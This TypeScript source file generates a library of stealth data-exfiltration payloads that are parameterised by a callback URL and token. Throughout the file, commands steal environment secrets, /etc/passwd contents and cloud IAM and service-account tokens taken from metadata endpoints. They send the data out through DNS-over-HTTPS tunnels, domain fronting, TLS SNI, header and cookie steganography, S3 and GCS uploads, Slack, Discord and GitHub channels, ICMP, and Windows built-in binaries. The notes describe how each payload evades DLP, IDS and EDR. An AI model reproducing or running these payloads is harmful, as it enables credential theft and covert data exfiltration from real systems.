export interface EchoPayload {
  id:       string;
  name:     string;
  category: string;
  protocol: "dns" | "http" | "https" | "icmp" | "ws" | "cloud" | "stealth";
  os:       "linux" | "windows" | "any";
  stealth:  1 | 2 | 3 | 4 | 5;
  command:  string;
  notes:    string;
}

const UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
  "python-requests/2.31.0",
  "Wget/1.21.4",
  "Go-http-client/2.0",
];
function ua(i = 0) { return UAS[i % UAS.length] ?? UAS[0]!; }
function oobHost(u: string): string {
  try { return new URL(u).hostname; } catch { return "oob.nexusforge.local"; }
}

export function buildDoHTunnelPayloads(domain: string, token: string): EchoPayload[] {
  const h = domain || "oob.nexusforge.local";
  return [
    {
      id:"doh_cf_jitter", name:"DoH Cloudflare + jitter + XOR", category:"DNS-over-HTTPS",
      protocol:"https", os:"linux", stealth:5,
      command:`python3 -c "
import urllib.request,base64,os,time,random,json
K=0x4e
data=open('/proc/self/environ','rb').read()[:200]+b'\n'+os.popen('id&&hostname').read().encode()
enc=base64.urlsafe_b64encode(bytes(b^K for b in data)).decode().rstrip('=')
hdrs={'accept':'application/dns-json','User-Agent':'${ua(0)}'}
for i in range(0,min(len(enc),400),40):
  chunk=enc[i:i+40]
  try:
    r=urllib.request.Request(f'https://cloudflare-dns.com/dns-query?name={chunk}.{i}.${token}.${h}&type=TXT',headers=hdrs)
    urllib.request.urlopen(r,timeout=4)
  except:pass
  time.sleep(random.uniform(0.3,1.2))
" 2>/dev/null &`,
      notes:"XOR-0x4e + base64url encodes data in DNS labels — sent via Cloudflare DoH (HTTPS/443). Jittered delays prevent timing-based detection.",
    },
    {
      id:"doh_domain_fronting", name:"Domain Fronting via CloudFront", category:"Domain-Fronting",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id|base64 -w0 2>/dev/null|tr '+/=' '-_~'|head -c80); curl -sk --resolve "legit-cdn.example.com:443:${h}" -H "Host: legit-cdn.example.com" "https://legit-cdn.example.com/${token}/$_D" -H "User-Agent: ${ua(0)}" 2>/dev/null &`,
      notes:"Domain fronting: TLS SNI=CDN hostname (passes DPI SNI inspection), HTTP Host header routes to actual C2. TLS visible to DPI is CDN hostname.",
    },
    {
      id:"sni_exfil", name:"TLS SNI hostname exfil", category:"TLS-Covert",
      protocol:"https", os:"linux", stealth:5,
      command:`python3 -c "
import ssl,socket,base64,os
data=os.popen('id&&hostname').read()[:50]
enc=base64.b32encode(data.encode()).decode().lower().replace('=','')
for i in range(0,len(enc),30):
  chunk=enc[i:i+30]
  try:
    ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname=False
    ctx.verify_mode=ssl.CERT_NONE
    s=ctx.wrap_socket(socket.socket(),server_hostname=f'{chunk}.${token}.${h}')
    s.connect(('${h}',443))
    s.close()
  except:pass
" 2>/dev/null &`,
      notes:"Data encoded in TLS SNI field during ClientHello — never reaches application layer. Logged at DNS/TLS inspection tier only if SNI logging is enabled.",
    },
    {
      id:"doh_google_fallback", name:"DoH Google + DNS-over-HTTPS fallback chain", category:"DNS-over-HTTPS",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(cat /etc/passwd 2>/dev/null|head -3|base64 -w0|tr '+/=' '-_~'); for _R in 'https://dns.google/resolve' 'https://cloudflare-dns.com/dns-query' 'https://dns.quad9.net:5053/dns-query'; do curl -fsk -H 'accept: application/dns-json' -H "User-Agent: ${ua(1)}" "$_R?name=$(echo $_D|head -c50).${token}.${h}&type=TXT" 2>/dev/null && break; done &`,
      notes:"Tries multiple DoH resolvers in chain — Google, Cloudflare, Quad9. Uses first that succeeds. Resilient to blocking any single resolver.",
    },
    {
      id:"doh_win_ps", name:"DoH Windows PowerShell + jitter", category:"DNS-over-HTTPS",
      protocol:"https", os:"windows", stealth:5,
      command:`powershell -NonI -W Hidden -c "$k=0x4e;$d=[Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String));$e=[Convert]::ToBase64String(($d|%{$_ -bxor $k})).Replace('+','-').Replace('/','_').Replace('=','');$u='https://dns.google/resolve?name='+$e.Substring(0,[Math]::Min(50,$e.Length))+'.${token}.${h}&type=TXT';try{$null=Invoke-WebRequest $u -UseBasicParsing -Headers @{'accept'='application/dns-json';'User-Agent'='${ua(0)}'} -TimeoutSec 5 -EA 0}catch{};Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 1200)"`,
      notes:"XOR-encrypted env vars exfil via Google DoH — PowerShell, no executables touched. Random sleep prevents timing correlation.",
    },
  ];
}

export function buildHttpHeaderStegPayloads(cbUrl: string, token: string): EchoPayload[] {
  return [
    {
      id:"header_xff_steg", name:"HTTP header steganography (X-Forwarded-For)", category:"Header-Steganography",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id|base64 -w0 2>/dev/null); python3 -c "
import urllib.request,base64
raw='$_D'
# Encode 3 bytes per XFF octet group
chunks=[raw[i:i+8] for i in range(0,min(len(raw),80),8)]
ip='.'.join(str(int(base64.b64decode(c.ljust(8,'A')+'==').hex()[:2],16)) for c in chunks[:4])
req=urllib.request.Request('${cbUrl}/${token}',headers={'X-Forwarded-For':ip,'X-Real-IP':ip,'User-Agent':'${ua(2)}','X-Request-ID':'${token}'})
urllib.request.urlopen(req,timeout=5)
" 2>/dev/null &`,
      notes:"Encodes exfil data inside X-Forwarded-For IP octets. Bypasses body-inspection DLP — header values rarely deep-inspected for content.",
    },
    {
      id:"header_cookie_steg", name:"Cookie steganography exfil", category:"Header-Steganography",
      protocol:"https", os:"linux", stealth:5,
      command:`_D=$(id&&hostname&&whoami|base64 -w0 2>/dev/null); curl -sk "${cbUrl}/${token}" -H "Cookie: _ga=$(echo $_D|head -c40); _gid=${token}; session=$(echo $_D|tail -c+41|head -c40)" -H "User-Agent: ${ua(0)}" 2>/dev/null &`,
      notes:"Data in GA/session cookie values — looks like Google Analytics tracking. Cookie values rarely inspected by DLP/CASB.",
    },
    {
      id:"http_multipart_exfil", name:"Multipart form-data exfil (file upload)", category:"Stealth-HTTP",
      protocol:"https", os:"linux", stealth:4,
      command:`_D=$(cat /etc/passwd 2>/dev/null|head -5|base64 -w0); curl -sk -X POST "${cbUrl}/${token}" -F "profile_pic=@/dev/stdin;type=image/jpeg;filename=avatar.jpg" -F "token=${token}" -H "User-Agent: ${ua(0)}" <<< "$_D" 2>/dev/null &`,
      notes:"Exfil via multipart/form-data file upload — content appears to be a JPEG file. Bypasses text-content DLP rules. Looks like profile picture upload.",
    },
    {
      id:"http_chunked_jitter", name:"Slow chunked POST + jitter (anti-IDS)", category:"Stealth-HTTP",
      protocol:"http", os:"linux", stealth:4,
      command:`python3 -c "
import socket,time,random,base64,os
host='${oobHost(cbUrl)}'
port=80
data=base64.b64encode(os.popen('id&&env|grep -iE pass|sec|key|tok').read().encode()).decode()
chunks=[data[i:i+6] for i in range(0,min(len(data),120),6)]
s=socket.socket()
s.connect((host,port))
s.send(f'POST /${token} HTTP/1.1\r\nHost:{host}\r\nTransfer-Encoding:chunked\r\nContent-Type:text/plain\r\nUser-Agent:${ua(0)}\r\n\r\n'.encode())
for c in chunks:
  s.send(f'{len(c):x}\r\n{c}\r\n'.encode())
  time.sleep(random.uniform(0.2,0.8))
s.send(b'0\r\n\r\n')
s.close()
" 2>/dev/null &`,
      notes:"Sends data in tiny 6-byte HTTP chunks with 200-800ms random delays. Volume-based DLP triggers are avoided. Timing correlation is randomized.",
    },
    {
      id:"http_jwt_channel", name:"JWT covert channel (claims exfil)", category:"Stealth-HTTP",
      protocol:"https", os:"linux", stealth:5,
      command:`python3 -c "
import base64,json,urllib.request,os
def mkjwt(payload):
  hdr=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).decode().rstrip('=')
  bod=base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
  return f'{hdr}.{bod}.fake_sig'
data={'sub':'user','exp':9999999999,'jti':'${token}','ctx':os.popen('id&&whoami').read()[:100]}
tok=mkjwt(data)
req=urllib.request.Request('${cbUrl}/${token}',headers={'Authorization':f'Bearer {tok}','User-Agent':'${ua(0)}'})
urllib.request.urlopen(req,timeout=5)
" 2>/dev/null &`,
      notes:"Exfil data encoded inside JWT claims — Authorization Bearer header. Looks like legitimate API authentication. JWT body rarely inspected by proxies.",
    },
  ];
}

export function buildCloudStorageExfil(cbUrl: string, token: string): EchoPayload[] {
  return [
    {
      id:"cloud_aws_s3_put", name:"AWS S3 PUT via IMDS IAM role creds", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:4,
      command:`_ROLE=$(curl -sk --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null|head -1); _CREDS=$(curl -sk --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_ROLE" 2>/dev/null); _KEY=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null); _SEC=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null); _TOK=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['Token'])" 2>/dev/null); (id;uname -a;env|grep -iE 'pass|secret|key|token|api') | curl -sk -X PUT -H "x-amz-security-token: $_TOK" -H "x-amz-content-sha256: UNSIGNED-PAYLOAD" -H "x-amz-meta-nx: ${token}" --upload-file - "https://s3.amazonaws.com/${token}-exfil/$(hostname)-$(date +%s).txt" 2>/dev/null &`,
      notes:"Uses EC2 instance IAM role from IMDS — zero credentials stored on disk. Traffic looks like legitimate AWS SDK S3 PutObject to an attacker-controlled bucket.",
    },
    {
      id:"cloud_s3_presigned", name:"AWS S3 presigned URL upload (no creds on target)", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:5,
      command:`(id;hostname;env|grep -iE 'pass|sec|key|tok|api'|head -20) | curl -sk -X PUT -H "Content-Type: application/octet-stream" -H "User-Agent: aws-sdk-go/1.44.0 (go1.21; linux; amd64)" "https://${token}.s3.amazonaws.com/${token}.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=PRESIGNED_CREDENTIAL&X-Amz-Date=PRESIGNED_DATE&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=PRESIGNED_SIG" --data-binary @- 2>/dev/null &`,
      notes:"Pre-generated presigned URL — no AWS creds on target at all. Operator pre-generates URL server-side, embeds it in payload. Looks like S3 SDK traffic.",
    },
    {
      id:"cloud_gcs_upload", name:"GCP GCS upload via metadata OAuth token", category:"Cloud-Storage",
      protocol:"cloud", os:"linux", stealth:4,
      command:`_TOK=$(curl -sk --max-time 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null); (id;uname -a;env) | curl -sk -X POST -H "Authorization: Bearer $_TOK" -H "Content-Type: text/plain" -H "User-Agent: google-api-go-client/0.10.0" "https://storage.googleapis.com/upload/storage/v1/b/${token}/o?uploadType=media&name=$(hostname).txt" --data-binary @- 2>/dev/null &`,
      notes:"GCP service account token from metadata API → GCS upload. Blends with GCP SDK operations. Audited in GCP Cloud Audit logs — route to attacker bucket.",
    },
    {
      id:"cloud_github_gist", name:"GitHub Gist private dead-drop", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_DATA=$(id;uname -a;env|grep -iE 'pass|sec|key|tok|api'|head -20); curl -sk -X POST https://api.github.com/gists -H "Authorization: token ${token}" -H "Content-Type: application/json" -H "User-Agent: github-api-v3" -d "{\\"public\\":false,\\"description\\":\\"config-$(hostname)\\",\\"files\\":{\\"data.json\\":{\\"content\\":\\"$(echo "$_DATA"|base64 -w0)\\"}}}" 2>/dev/null &`,
      notes:"Creates private GitHub Gist — HTTPS to github.com on port 443. Indistinguishable from developer API usage. Persistent until gist deleted.",
    },
    {
      id:"slack_webhook_exfil", name:"Slack Webhook covert drop", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_MSG=$(id;hostname;whoami;ip addr 2>/dev/null|grep 'inet '||ifconfig 2>/dev/null|grep 'inet '); curl -sk -X POST "https://hooks.slack.com/services/${token}" -H "Content-type: application/json" -H "User-Agent: Slackbot 1.0 (+https://api.slack.com/robots)" --data "{\\"text\\":\\"$(echo "$_MSG"|head -c3800|base64 -w0)\\"}" 2>/dev/null &`,
      notes:"Slack incoming webhook — HTTPS to slack.com. User-Agent matches Slack's own bot. Blocked only if all Slack traffic is blocked.",
    },
    {
      id:"discord_webhook_exfil", name:"Discord Webhook covert channel", category:"Social-Platform",
      protocol:"cloud", os:"linux", stealth:3,
      command:`_MSG=$(id;hostname;env|grep -iE 'pass|sec|key|tok'); curl -sk -X POST "https://discord.com/api/webhooks/${token}" -H "Content-Type: application/json" -H "User-Agent: DiscordBot (https://discord.js.org, 14.0.0)" -d "{\\"content\\":\\"$(echo "$_MSG"|base64 -w0|head -c1900)\\"}" 2>/dev/null &`,
      notes:"Discord webhook HTTPS — User-Agent matches Discord.js library. Traffic looks like bot/game client. Blends into corporate networks with Discord usage.",
    },
  ];
}

export function buildIcmpTunnelPayloads(lhost: string, token: string): EchoPayload[] {
  return [
    {
      id:"icmp_python_raw", name:"Python raw ICMP covert channel", category:"ICMP-Tunnel",
      protocol:"icmp", os:"linux", stealth:4,
      command:`python3 -c "
import socket,struct,os,time,random,base64
K=0x4e
def ck(d):
  s=0
  for i in range(0,len(d),2):w=d[i]+(d[i+1]<<8 if i+1<len(d) else 0);s=(s+w)&0xffff
  return ~s&0xffff
data=base64.b64encode(bytes(b^K for b in os.popen('id&&hostname&&whoami').read().encode()[:48])).decode()[:48].encode()
hdr=struct.pack('!BBHHH',8,0,0,0,1)
hdr=struct.pack('!BBHHH',8,0,ck(hdr+data),0,1)
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
for _ in range(4):s.sendto(hdr+data,('${lhost}',0));time.sleep(random.uniform(0.5,2.0))
s.close()
" 2>/dev/null &`,
      notes:"Raw ICMP with XOR-encoded payload + random inter-packet jitter. Bypasses all TCP/UDP egress filters. Requires CAP_NET_RAW or root.",
    },
    {
      id:"icmp_ping_timing", name:"ICMP timing covert channel (binary encoding)", category:"ICMP-Covert",
      protocol:"icmp", os:"linux", stealth:5,
      command:`python3 -c "
import subprocess,time
data=b'$(id 2>/dev/null|base64 -w0 2>/dev/null)'[:32]
bits=''.join(f'{b:08b}' for b in data)
for bit in bits:
  subprocess.run(['ping','-c1','-W','1','${lhost}'],capture_output=True)
  time.sleep(0.8 if bit=='1' else 0.2)
" 2>/dev/null &`,
      notes:"Pure timing covert channel using ICMP ping intervals. '1'=800ms delay, '0'=200ms. Zero payload inspection possible. Very slow (~8 bits/second).",
    },
  ];
}

export function buildWindowsExfilPayloads(cbUrl: string, token: string): EchoPayload[] {
  return [
    {
      id:"win_certutil_exfil", name:"Windows certutil + DNS exfil (LOLBin)", category:"LOLBAS-Exfil",
      protocol:"dns", os:"windows", stealth:3,
      command:`powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env:|Out-String))).Replace('=','');$d.ToCharArray()|%{[void](Resolve-DnsName -Name \"$([Uri]::EscapeDataString($_)).${token}.${oobHost(cbUrl)}\" -Type A -EA 0)}" &`,
      notes:"Exfils env vars one char at a time as DNS lookups. Relies only on Resolve-DnsName (built-in). No network sockets opened directly.",
    },
    {
      id:"win_http_wmi", name:"Windows WMI HTTP exfil (no PowerShell)", category:"LOLBAS-Exfil",
      protocol:"https", os:"windows", stealth:4,
      command:`wmic /node:localhost process call create "cmd.exe /c (for /f \"tokens=*\" %i in ('set') do @echo %i)>%TEMP%\\nx.txt && curl -sk -X POST ${cbUrl}/${token} -H \"User-Agent: ${ua(0)}\" --data-binary @%TEMP%\\nx.txt && del %TEMP%\\nx.txt"`,
      notes:"WMI process creation → cmd.exe env dump → curl POST. No PowerShell. Parent is WmiPrvSE.exe. Breaks EDR parent-chain detection.",
    },
    {
      id:"win_bits_exfil", name:"Windows BITS (Background Intelligent Transfer) exfil", category:"LOLBAS-Exfil",
      protocol:"https", os:"windows", stealth:5,
      command:`powershell -NonI -W Hidden -c "$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Process|Out-String)+'---'+(Get-ChildItem Env:|Out-String)));$u='${cbUrl}/${token}/'+$d.Substring(0,[Math]::Min(200,$d.Length));Start-BitsTransfer -Source $u -Destination $env:TEMP\\nx.tmp -TransferType Download -EA 0;Remove-Item $env:TEMP\\nx.tmp -EA 0"`,
      notes:"BITS is a signed Windows service (svchost). Exfil appears as legitimate background download. Bypasses many endpoint firewall rules that whitelist BITS traffic.",
    },
  ];
}

export function buildAllEchoPayloads(cbUrl: string, token: string): EchoPayload[] {
  const host = oobHost(cbUrl);
  return [
    ...buildDoHTunnelPayloads(host, token),
    ...buildHttpHeaderStegPayloads(cbUrl, token),
    ...buildCloudStorageExfil(cbUrl, token),
    ...buildIcmpTunnelPayloads(host, token),
    ...buildWindowsExfilPayloads(cbUrl, token),
  ];
}
